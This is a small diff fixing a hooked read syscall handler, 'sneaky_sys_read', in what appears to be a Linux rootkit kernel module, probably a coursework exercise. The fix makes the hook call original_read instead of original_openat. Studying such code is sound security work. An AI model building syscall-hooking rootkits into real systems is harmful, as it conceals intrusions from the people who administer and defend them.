@@ -104,7 +104,7 @@ asmlinkage ssize_t sneaky_sys_read(struct pt_regs *regs) {
     }
     return nread;
      */
-    return (*original_openat)(regs);
+    return (*original_read)(regs);
 }
 
 // The code that gets executed when the module is loaded
